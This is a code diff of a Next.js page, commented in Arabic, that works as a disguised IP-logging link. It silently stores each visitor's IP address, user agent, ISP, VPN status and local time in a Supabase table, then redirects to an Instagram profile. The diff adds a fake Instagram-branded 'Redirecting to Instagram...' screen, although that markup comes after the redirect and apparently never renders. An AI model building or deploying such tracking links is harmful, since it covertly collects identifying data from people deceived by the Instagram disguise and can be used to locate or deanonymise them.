@@ -39,7 +39,7 @@ export default async function Page() {
 
   const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY)
 
-  // تسجيل البيانات مع إضافة ملاحظة أنها من رابط الإنستقرام
+  // تسجيل البيانات في قاعدة البيانات
   await supabase.from('visitor_logs').insert([{
     ip_address: ip,
     user_agent: ua,
@@ -49,9 +49,46 @@ export default async function Page() {
     isp: ispData.isp,
     local_time: jordanTime,
     is_vpn: ispData.is_vpn,
-    notes: 'Instagram Project' // لتمييز هذا المشروع عن الأول
+    notes: 'Instagram Project' // ميزنا المشروع هنا
   }])
 
-  // الرابط الوجهة الخاص بك
+  // توجيه الزائر بعد ثانية واحدة لضمان ظهور التصميم للحظة
+  // يمكنك استخدام redirect مباشرة أو إضافة تأخير بسيط بالكود
   redirect('https://www.instagram.com/aibn.taymia?igsh=eGtoczg2ZnYydDds')
+
+  return (
+    <div style={{ 
+      display: 'flex', 
+      flexDirection: 'column', 
+      alignItems: 'center', 
+      justifyContent: 'center', 
+      height: '100vh', 
+      backgroundColor: '#fafafa',
+      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' 
+    }}>
+      <img 
+        src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
+        alt="Instagram" 
+        style={{ width: '80px', height: '80px', marginBottom: '20px' }} 
+      />
+      <p style={{ color: '#262626', fontSize: '18px', fontWeight: '500' }}>Redirecting to Instagram...</p>
+      <div className="loader"></div>
+      
+      <style dangerouslySetInnerHTML={{ __html: `
+        .loader {
+          border: 3px solid #dbdbdb;
+          border-top: 3px solid #3897f0;
+          border-radius: 50%;
+          width: 24px;
+          height: 24px;
+          animation: spin 0.8s linear infinite;
+          margin-top: 20px;
+        }
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+      `}} />
+    </div>
+  )
 }
